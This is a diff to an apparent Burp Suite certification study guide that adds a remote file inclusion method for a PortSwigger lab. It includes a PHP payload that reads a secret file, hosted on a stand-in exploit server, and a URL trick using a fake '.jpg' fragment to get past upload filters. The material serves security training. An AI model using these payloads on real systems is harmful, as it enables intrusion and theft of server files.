@@ -3600,7 +3600,19 @@ csrf=u4r8fg90d7b09j4mm6k67m3&fileurl=http://localhost:6566/
 ![RFI function](images/RFI-function.png)  
   
 >I am missing some key info and need to ***identify*** PortSwigger research about RFI.  
-  
+
+>But the method below works for sure. It is taken from DingyShark's git (https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#file-upload-vulnerabilities)
+
+1. To exploit this vulnerability, paste php payload in body section of your exploit server and name it shell.php:
+```
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+```
+
+2. To bypass filters and provoke RFI, use the next payload:
+```
+https://exploit-server.com/shell.php#kek.jpg
+```
+
 ### XSS SVG Upload  
 
 >Uploading of SVG file that contains JavaScript that performs cross site scripting attack.  
